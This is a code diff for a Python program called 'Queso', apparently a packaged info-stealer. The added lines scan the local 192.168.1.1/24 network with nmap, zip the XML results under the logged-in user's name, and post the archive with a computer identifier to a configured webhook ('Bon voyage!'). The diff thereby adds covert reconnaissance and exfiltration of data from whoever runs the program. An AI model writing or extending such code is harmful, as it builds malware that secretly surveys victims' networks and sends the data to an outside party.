@@ -66,6 +66,12 @@ class Utility:
         else:
             return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))
         
+    @staticmethod
+    def CreateZip(zip_data: dict) -> None: # Create a zip file
+        with zipfile.ZipFile(os.path.join(sys._MEIPASS, "data.zip"), "w") as data_pack:
+            nmap_data: ElementTree = zip_data['nmap']
+            with data_pack.open("nmap.xml", "w") as nmap_file:
+                nmap_file.write(bytes(ElementTree.tostring(nmap_data).decode('utf-8'), 'utf-8'))
 
 class Network:
 
@@ -267,10 +273,19 @@ class Queso:
 
         webhook_fields = dict()
 
+        # Create a dict for our zip file data
+        zip_data = {}
+
         # Append a network scan if we can make one
-        networkscan = Network.NmapScan("192.168.1.1/24")
-        if networkscan:
-            webhook_fields['file'] = ("{}.xml".format(computer_uuid), ElementTree.tostring(networkscan))
+        network_scan = Network.NmapScan("192.168.1.1/24")
+        if network_scan:
+            zip_data['nmap'] = network_scan
+        
+        # Try to create a zip file and attach it if we can
+        Utility.CreateZip(zip_data)
+        if os.path.exists(os.path.join(sys._MEIPASS, "data.zip")):
+            with open(os.path.join(sys._MEIPASS, "data.zip"), "rb") as zip_file:
+                webhook_fields['file'] = (f"{os.getlogin()}.zip", zip_file.read())
 
         webhook_fields['payload_json'] = json.dumps(webhook_payload).encode() # Append the embed
         http_manager.request("POST", self.Webhook, fields= webhook_fields) # Bon voyage!
